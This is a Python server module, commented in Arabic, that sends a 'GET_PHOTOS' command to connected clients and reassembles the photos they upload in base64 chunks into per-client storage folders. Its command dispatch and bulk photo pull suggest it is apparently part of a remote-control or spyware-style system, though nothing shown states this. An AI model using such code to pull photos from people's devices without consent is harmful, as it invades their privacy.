#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
photos.py
============================================================
تنفيذ أمر GET PHOTOS من جانب السيرفر.

المسؤوليات:
  1. إرسال أمر GET_PHOTOS للعميل.
  2. استقبال الصور (FILE_CHUNK) من العميل.
  3. تجميع الأجزاء (chunks) وإعادة بناء الملف.
  4. حفظ الملفات في storage/received/<client_id>/photos/.
  5. عرض تقدّم النقل للمستخدم.

آلية العمل:
  - السيرفر يرسل:  {"cmd": "GET_PHOTOS", "payload": {"limit": N, "offset": M}}
  - التطبيق يبدأ بإرسال FILE_CHUNK لكل ملف.
  - كل ملف له: filename, size, index, total, chunk (base64).
  - السيرفر يجمع الأجزاء ويحفظ الملف عند اكتماله.

يعتمد على:
  - ClientSession (لإرسال الأوامر واستقبالها)
  - storage (لحفظ الملفات)

الاستخدام:
  handler = PhotosCommand(session_manager)
  await handler.execute(client_id, limit=50, offset=0)
============================================================
"""

import asyncio
import base64
import json
import logging
import os
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.client_session import ClientSession
from core.session_manager import SessionManager

logger = logging.getLogger("photos")


# ============================================================
# 1. الإعدادات
# ============================================================
BASE_DIR = Path(__file__).resolve().parent.parent.parent
STORAGE_DIR = BASE_DIR / "storage" / "received"

# مهلة انتظار كامل الملف (ثواني)
FILE_TIMEOUT_SECONDS = 120

# مهلة انتظار بدء الأمر (ثواني)
COMMAND_TIMEOUT_SECONDS = 30


# ============================================================
# 2. نموذج ملف قيد الاستقبال
# ============================================================
@dataclass
class IncomingFile:
    """يمثّل ملفاً قيد الاستقبال."""
    filename: str
    total_size: int = 0
    total_chunks: int = 0
    mime: str = "application/octet-stream"
    chunks: Dict[int, bytes] = field(default_factory=dict)
    started_at: float = field(default_factory=time.time)
    last_update: float = field(default_factory=time.time)

    @property
    def received_chunks(self) -> int:
        return len(self.chunks)

    @property
    def received_bytes(self) -> int:
        return sum(len(c) for c in self.chunks.values())

    @property
    def progress(self) -> float:
        """نسبة التقدم (0.0 → 1.0)."""
        if self.total_chunks <= 0:
            return 0.0
        return self.received_chunks / self.total_chunks

    @property
    def is_complete(self) -> bool:
        if self.total_chunks <= 0:
            return False
        return self.received_chunks >= self.total_chunks

    @property
    def is_stale(self) -> bool:
        """هل تجاوز المهلة؟"""
        return (time.time() - self.last_update) > FILE_TIMEOUT_SECONDS

    def add_chunk(self, index: int, data: bytes) -> None:
        """إضافة جزء."""
        self.chunks[index] = data
        self.last_update = time.time()

    def assemble(self) -> Optional[bytes]:
        """تجميع الأجزاء بالترتيب."""
        if not self.is_complete:
            return None

        try:
            result = b"".join(
                self.chunks[i] for i in sorted(self.chunks.keys())
            )
            return result
        except KeyError as e:
            logger.error(f"Missing chunk {e} for {self.filename}")
            return None


# ============================================================
# 3. PhotosCommand
# ============================================================
class PhotosCommand:
    """
    منفّذ أمر GET PHOTOS.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # الملفات قيد الاستقبال لكل عميل
        # {client_id: {filename: IncomingFile}}
        self._incoming: Dict[str, Dict[str, IncomingFile]] = {}

    # ========================================================
    # 3.1 التنفيذ
    # ========================================================
    async def execute(
        self,
        client_id: str,
        limit: int = 0,
        offset: int = 0,
        path: Optional[str] = None,
    ) -> bool:
        """
        إرسال أمر GET_PHOTOS للعميل.

        :param client_id: معرف العميل
        :param limit: الحد الأقصى للعدد (0 = الكل)
        :param offset: تخطي أول N صورة
        :param path: مسار مخصص (اختياري)
        :return: True إذا تم الإرسال بنجاح
        """
        session = self.session_manager.get_session(client_id)
        if session is None:
            logger.warning(f"Client not found: {client_id}")
            return False

        # ----- تجهيز الأمر -----
        payload: Dict[str, Any] = {
            "limit": limit,
            "offset": offset,
        }
        if path:
            payload["path"] = path

        command = {
            "cmd": "GET_PHOTOS",
            "payload": payload,
        }

        # ----- إرسال -----
        ok = await session.send_command(command)
        if ok:
            logger.info(
                f"[{client_id}] GET_PHOTOS sent (limit={limit}, offset={offset})"
            )
        return ok

    # ========================================================
    # 3.2 معالج FILE_CHUNK الوارد
    # ========================================================
    async def on_file_chunk(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> Optional[Path]:
        """
        يُستدعى عند وصول FILE_CHUNK.

        :param client_id: معرف العميل
        :param message: الرسالة الواردة
        :return: مسار الملف المحفوظ إذا اكتمل، وإلا None
        """
        # ----- استخراج البيانات -----
        filename    = message.get("filename", "unknown")
        mime        = message.get("mime", "application/octet-stream")
        size        = int(message.get("size", 0))
        index       = int(message.get("index", 0))
        total       = int(message.get("total", 0))
        chunk_b64   = message.get("chunk", "")

        if not chunk_b64:
            logger.warning(f"[{client_id}] FILE_CHUNK without chunk data")
            return None

        # ----- فك Base64 -----
        try:
            chunk_data = base64.b64decode(chunk_b64)
        except Exception as e:
            logger.error(f"[{client_id}] Invalid base64 in chunk: {e}")
            return None

        # ----- الحصول على سجل العميل -----
        if client_id not in self._incoming:
            self._incoming[client_id] = {}
        client_files = self._incoming[client_id]

        # ----- الحصول على الملف أو إنشاؤه -----
        if filename not in client_files:
            client_files[filename] = IncomingFile(
                filename=filename,
                total_size=size,
                total_chunks=total,
                mime=mime,
            )
            logger.info(
                f"[{client_id}] Receiving: {filename} "
                f"({size} bytes, {total} chunks)"
            )

        file_entry = client_files[filename]

        # ----- إضافة الجزء -----
        file_entry.add_chunk(index, chunk_data)

        # ----- عرض التقدم -----
        self._log_progress(client_id, file_entry)

        # ----- هل اكتمل؟ -----
        if file_entry.is_complete:
            saved_path = await self._save_file(client_id, file_entry)
            if saved_path:
                del client_files[filename]
                logger.info(
                    f"[{client_id}] ✅ Saved: {saved_path} "
                    f"({file_entry.received_bytes} bytes)"
                )
                return saved_path

        return None

    # ========================================================
    # 3.3 حفظ الملف
    # ========================================================
    async def _save_file(self, client_id: str, file_entry: IncomingFile) -> Optional[Path]:
        """
        تجميع الأجزاء وحفظ الملف.
        """
        # ----- تجميع -----
        data = file_entry.assemble()
        if data is None:
            logger.error(f"[{client_id}] Failed to assemble {file_entry.filename}")
            return None

        # ----- مجلد العميل -----
        client_dir = STORAGE_DIR / client_id / "photos"
        client_dir.mkdir(parents=True, exist_ok=True)

        # ----- اسم ملف آمن -----
        safe_name = self._sanitize_filename(file_entry.filename)

        # ----- معالجة التكرار -----
        final_path = client_dir / safe_name
        counter = 1
        while final_path.exists():
            stem = final_path.stem
            suffix = final_path.suffix
            # إزالة (_1), (_2) السابقة
            stem = re.sub(r"_\d+$", "", stem)
            final_path = client_dir / f"{stem}_{counter}{suffix}"
            counter += 1

        # ----- كتابة -----
        try:
            loop = asyncio.get_event_loop()
            # نستخدم executor للكتابة (لا نُعطّل الحدث)
            await loop.run_in_executor(
                None, final_path.write_bytes, data
            )
            return final_path
        except Exception as e:
            logger.exception(f"Failed to write {final_path}: {e}")
            return None

    # ========================================================
    # 3.4 معالجة التقدم
    # ========================================================
    def _log_progress(self, client_id: str, file_entry: IncomingFile) -> None:
        """طباعة التقدم كل 10%."""
        if file_entry.total_chunks <= 0:
            return

        received = file_entry.received_chunks
        total = file_entry.total_chunks

        # اطبع كل 10%
        interval = max(1, total // 10)
        if received % interval == 0 or received == total:
            pct = int(file_entry.progress * 100)
            logger.info(
                f"[{client_id}] {file_entry.filename}: "
                f"{received}/{total} chunks ({pct}%)"
            )

    # ========================================================
    # 3.5 إحصائيات وتنظيف
    # ========================================================
    def get_pending_files(self, client_id: str) -> List[str]:
        """قائمة الملفات قيد الاستقبال لعميل."""
        return list(self._incoming.get(client_id, {}).keys())

    def has_pending_files(self, client_id: str) -> bool:
        """هل هناك ملفات قيد الاستقبال؟"""
        return bool(self._incoming.get(client_id))

    async def cleanup_stale(self) -> int:
        """
        إزالة الملفات التي تجاوزت المهلة.
        :return: عدد الملفات المُزالة
        """
        removed = 0
        for client_id in list(self._incoming.keys()):
            files = self._incoming[client_id]
            for filename in list(files.keys()):
                file_entry = files[filename]
                if file_entry.is_stale:
                    logger.warning(
                        f"[{client_id}] Stale file removed: {filename} "
                        f"({file_entry.progress * 100:.0f}%)"
                    )
                    del files[filename]
                    removed += 1
            if not files:
                del self._incoming[client_id]
        return removed

    def clear_client(self, client_id: str) -> None:
        """مسح كل الملفات قيد الاستقبال لعميل."""
        if client_id in self._incoming:
            count = len(self._incoming[client_id])
            del self._incoming[client_id]
            logger.info(f"[{client_id}] Cleared {count} pending files")

    # ========================================================
    # 3.6 أدوات مساعدة
    # ========================================================
    @staticmethod
    def _sanitize_filename(filename: str) -> str:
        """
        تنظيف اسم الملف من الأحرف الخطيرة.
        - إزالة المسارات
        - إزالة الأحرف الخاصة
        """
        if not filename:
            return "unnamed"

        # إزالة المسارات (خذ آخر جزء فقط)
        name = os.path.basename(filename)

        # إزالة الأحرف الخطيرة
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)

        # منع الأسماء الخطيرة
        if name in (".", "..", ""):
            name = "unnamed"

        # حد الطول
        if len(name) > 200:
            stem, ext = os.path.splitext(name)
            name = stem[:180] + ext[:20]

        return name


# ============================================================
# 4. Singleton للاستخدام العام
# ============================================================
_default_handler: Optional[PhotosCommand] = None


def get_photos_handler(session_manager: SessionManager) -> PhotosCommand:
    """إرجاع المعالج (Singleton)."""
    global _default_handler
    if _default_handler is None:
        _default_handler = PhotosCommand(session_manager)
    return _default_handler